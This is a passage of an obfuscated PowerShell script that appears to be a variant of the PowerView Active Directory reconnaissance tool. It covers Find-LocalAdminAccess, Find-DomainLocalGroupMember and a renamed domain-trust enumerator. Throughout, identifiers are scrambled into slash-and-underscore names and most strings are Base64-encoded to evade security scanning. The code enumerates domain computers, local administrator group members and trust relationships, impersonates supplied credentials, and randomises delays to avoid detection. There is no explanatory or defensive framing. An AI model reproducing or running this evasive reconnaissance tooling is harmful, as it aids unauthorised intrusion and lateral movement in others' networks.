                    if (${_/=\/\__/====\/\_}.IsAdmin) {
                        ${__/\_/==\/\/=\/\_}
                    }
                }
            }
            if (${__/\__/\/\/\_/\/==}) {
                _/==\_/\/=\_/==\/\
            }
        }
        ${__/=\___/\_/\__/\} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential
            }
            else {
                ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential -__/\/=\/==\/=\/=\_
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-LocalAdminAccess] Total number of hosts: $(${_/\/\/\/=\_/=\__/}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAARABlAGwAYQB5ADoAIAAkAEQAZQBsAGEAeQAsACAASgBpAHQAdABlAHIAOgAgACQASgBpAHQAdABlAHIA')))
            ${__/=\/=\/\_____/\} = 0
            ${/=\/=\_/\_/==\/=\} = New-Object System.Random
            ForEach (${__/\_/==\/\/=\/\_} in ${_/\/\/\/=\_/=\__/}) {
                ${__/=\/=\/\_____/\} = ${__/=\/=\/\_____/\} + 1
                sleep -Seconds ${/=\/=\_/\_/==\/=\}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-LocalAdminAccess] Enumerating server ${__/\_/==\/\/=\/\_} (${__/=\/=\/\_____/\} of $(${_/\/\/\/=\_/=\__/}.count))"
                icm -ScriptBlock ${__/\/==\/\/=\/\__} -ArgumentList ${__/\_/==\/\/=\/\_}, ${__/=\___/\_/\__/\}
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAAVQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwA6ACAAJABUAGgAcgBlAGEAZABzAA==')))
            ${/===\/=\/\/\_/=\_} = @{
                'TokenHandle' = ${__/=\___/\_/\__/\}
            }
            _/=\/===\__/==\/\_ -/=\/\/\/=\__/\_/= ${_/\/\/\/=\_/=\__/} -____/\_/==\_/==\_/ ${__/\/==\/\/=\/\__} -_/===\/==\_/=\_/\_ ${/===\/=\/\/\_/=\_} -Threads $Threads
        }
    }
}
function Find-DomainLocalGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${/=\/\/\/=\__/\_/=},
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${_/\/\_/===\_/=\/\} = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${_/\/====\/\/=\_/=} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${__/==\/=\__/==\/==} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${__/===\/==\_/=\/\_} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${__/==========\_/=\} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${_/\/\/\/=\_/=\__/} = ${/=\/\/\/=\__/\_/=}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAUQB1AGUAcgB5AGkAbgBnACAAYwBvAG0AcAB1AHQAZQByAHMAIABpAG4AIAB0AGgAZQAgAGQAbwBtAGEAaQBuAA==')))
            ${_/\/\/\/=\_/=\__/} = __/\/\/=\/\_/==\/\ @_/\/====\/\/=\_/= | select -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainLocalGroupMember] TargetComputers length: $(${_/\/\/\/=\_/=\__/}.Length)"
        if (${_/\/\/\/=\_/=\__/}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAATgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUA')))
        }
        ${__/\/==\/\/=\/\__} = {
            Param(${/=\/\/\/=\__/\_/=}, ${_/\/\_/===\_/=\/\}, $Method, ${__/\__/\/\/\_/\/==})
            if (${_/\/\_/===\_/=\/\} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                ${__/=\__/\_/=====\} = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                ${_/\/\_/===\_/=\/\} = (${__/=\__/\_/=====\}.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }
            if (${__/\__/\/\/\_/\/==}) {
                $Null = __/\__/\/==\/==\_/ -__/\__/\/\/\_/\/== ${__/\__/\/\/\_/\/==} -__/\/=\/==\/=\/=\_
            }
            ForEach (${__/\_/==\/\/=\/\_} in ${/=\/\/\/=\__/\_/=}) {
                ${_/\/==\___/\/=\__} = Test-Connection -Count 1 -Quiet -ComputerName ${__/\_/==\/\/=\/\_}
                if (${_/\/==\___/\/=\__}) {
                    ${/=====\___/\/=\/\} = @{
                        'ComputerName' = ${__/\_/==\/\/=\/\_}
                        'Method' = $Method
                        'GroupName' = ${_/\/\_/===\_/=\/\}
                    }
                    __/=\/===\_/=\/==\ @/=====\___/\/=\/\
                }
            }
            if (${__/\__/\/\/\_/\/==}) {
                _/==\_/\/=\_/==\/\
            }
        }
        ${__/=\___/\_/\__/\} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential
            }
            else {
                ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential -__/\/=\/==\/=\/=\_
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainLocalGroupMember] Total number of hosts: $(${_/\/\/\/=\_/=\__/}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARABlAGwAYQB5ADoAIAAkAEQAZQBsAGEAeQAsACAASgBpAHQAdABlAHIAOgAgACQASgBpAHQAdABlAHIA')))
            ${__/=\/=\/\_____/\} = 0
            ${/=\/=\_/\_/==\/=\} = New-Object System.Random
            ForEach (${__/\_/==\/\/=\/\_} in ${_/\/\/\/=\_/=\__/}) {
                ${__/=\/=\/\_____/\} = ${__/=\/=\/\_____/\} + 1
                sleep -Seconds ${/=\/=\_/\_/==\/=\}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainLocalGroupMember] Enumerating server ${__/\_/==\/\/=\/\_} (${__/=\/=\/\_____/\} of $(${_/\/\/\/=\_/=\__/}.count))"
                icm -ScriptBlock ${__/\/==\/\/=\/\__} -ArgumentList ${__/\_/==\/\/=\/\_}, ${_/\/\_/===\_/=\/\}, $Method, ${__/=\___/\_/\__/\}
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwA6ACAAJABUAGgAcgBlAGEAZABzAA==')))
            ${/===\/=\/\/\_/=\_} = @{
                'GroupName' = ${_/\/\_/===\_/=\/\}
                'Method' = $Method
                'TokenHandle' = ${__/=\___/\_/\__/\}
            }
            _/=\/===\__/==\/\_ -/=\/\/\/=\__/\_/= ${_/\/\/\/=\_/=\__/} -____/\_/==\_/==\_/ ${__/\/==\/\/=\/\__} -_/===\/==\_/=\_/\_ ${/===\/=\/\/\_/=\_} -Threads $Threads
        }
    }
    END {
        if (${__/=\___/\_/\__/\}) {
            _/==\_/\/=\_/==\/\ -__/\__/\/\/\_/\/== ${__/=\___/\_/\__/\}
        }
    }
}
function _/=\/==\/\_/=\____ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_____/\/\_/=====\} = @{
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAE4AXwBUAFIAQQBOAFMASQBUAEkAVgBFAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBQAEwARQBWAEUATABfAE8ATgBMAFkA')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBJAEwAVABFAFIAXwBTAEkARABTAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBPAFIARQBTAFQAXwBUAFIAQQBOAFMASQBUAEkAVgBFAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAE8AUwBTAF8ATwBSAEcAQQBOAEkAWgBBAFQASQBPAE4A')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBJAFQASABJAE4AXwBGAE8AUgBFAFMAVAA=')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADQAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAEUAQQBUAF8AQQBTAF8ARQBYAFQARQBSAE4AQQBMAA==')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADgAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAF8AVQBTAEUAUwBfAFIAQwA0AF8ARQBOAEMAUgBZAFAAVABJAE8ATgA=')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAxADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAF8AVQBTAEUAUwBfAEEARQBTAF8ASwBFAFkAUwA=')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAyADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAE8AUwBTAF8ATwBSAEcAQQBOAEkAWgBBAFQASQBPAE4AXwBOAE8AXwBUAEcAVABfAEQARQBMAEUARwBBAFQASQBPAE4A')))
            [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAA0ADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABJAE0AXwBUAFIAVQBTAFQA')))
        }
        ${/==\/\___/=\__/==} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/==\/\___/=\__/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${/==\/\___/=\__/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${/==\/\___/=\__/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/==\/\___/=\__/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/==\/\___/=\__/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/==\/\___/=\__/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/==\/\___/=\__/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/==\/\___/=\__/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/==\/\___/=\__/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/==\/\___/=\__/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
            ${_/\_/\__/====\___} = @{}
            if ($Domain -and $Domain.Trim() -ne '') {
                ${/====\__/\/\/\/\_} = $Domain
            }
            else {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                    ${/====\__/\/\/\/\_} = (__/\/\__/=\/\/\/\/ -Credential $Credential).Name
                }
                else {
                    ${/====\__/\/\/\/\_} = (__/\/\__/=\/\/\/\/).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))) {
            if ($Domain -and $Domain.Trim() -ne '') {
                ${/====\__/\/\/\/\_} = $Domain
            }
            else {
                ${/====\__/\/\/\/\_} = $Env:USERDNSDOMAIN
            }
        }
        if ($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA=')))) {
            ${/==\/===\___/\/=\} = _/=\_/=\_/==\_/\/\ @/==\/\___/=\__/==
            ${_/\_/=\/==\/\_/=\} = __/\/=\___/==\_/=\ @_/\_/\__/====\___
            if (${/==\/===\___/\/=\}) {
                ${/==\/===\___/\/=\}.Filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQB0AHIAdQBzAHQAZQBkAEQAbwBtAGEAaQBuACkA')))
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${_/\__/\/=====\_/\} = ${/==\/===\___/\/=\}.FindOne() }
                else { ${_/\__/\/=====\_/\} = ${/==\/===\___/\/=\}.FindAll() }
                ${_/\__/\/=====\_/\} | ? {$_} | % {
                    ${/=\__/=\_/\__/==\} = $_.Properties
                    ${/=\__/\/=\___/\__} = New-Object PSObject
                    ${_/=======\__/\___} = @()
                    ${_/=======\__/\___} += ${_____/\/\_/=====\}.Keys | ? { ${/=\__/=\_/\__/==\}.trustattributes[0] -band $_ } | % { ${_____/\/\_/=====\}[$_] }
                    ${__/\_/=\_____/==\} = Switch (${/=\__/=\_/\__/==\}.trustdirection) {
                        0 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) }
                        1 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGIAbwB1AG4AZAA='))) }
                        2 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAYgBvAHUAbgBkAA=='))) }
                        3 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBpAGQAaQByAGUAYwB0AGkAbwBuAGEAbAA='))) }
                    }
                    ${_/\/\/\_/=\/=\/==} = Switch (${/=\__/=\_/\__/==\}.trusttype) {
                        1 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBJAE4ARABPAFcAUwBfAE4ATwBOAF8AQQBDAFQASQBWAEUAXwBEAEkAUgBFAEMAVABPAFIAWQA='))) }
                        2 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBJAE4ARABPAFcAUwBfAEEAQwBUAEkAVgBFAF8ARABJAFIARQBDAFQATwBSAFkA'))) }
                        3 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBJAFQA'))) }
                    }
                    ${/==\_/=\/\__/\_/=} = ${/=\__/=\_/\__/==\}.distinguishedname[0]
                    ${__/\__/===\/=\___} = ${/==\_/=\/\__/\_/=}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))
                    if (${__/\__/===\/=\___}) {
                        ${/====\__/\/\/\/\_} = $(${/==\_/=\/\__/\_/=}.SubString(${__/\__/===\/=\___})) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    }
                    else {
                        ${/====\__/\/\/\/\_} = ""
                    }
                    ${/=\/=\/==\/==\_/=} = ${/==\_/=\/\__/\_/=}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABDAE4APQBTAHkAcwB0AGUAbQA='))))
                    if (${__/\__/===\/=\___}) {
                        $TargetDomain = ${/==\_/=\/\__/\_/=}.SubString(3, ${/=\/=\/==\/==\_/=}-3)
                    }
                    else {
                        $TargetDomain = ""
                    }
                    ${/==\/\/\/\/\/\_/=} = New-Object Guid @(,${/=\__/=\_/\__/==\}.objectguid[0])
                    ${_/\__/====\/\__/\} = (New-Object System.Security.Principal.SecurityIdentifier(${/=\__/=\_/\__/==\}.securityidentifier[0],0)).Value
                    ${/=\__/\/=\___/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUATgBhAG0AZQA='))) ${/====\__/\/\/\/\_}
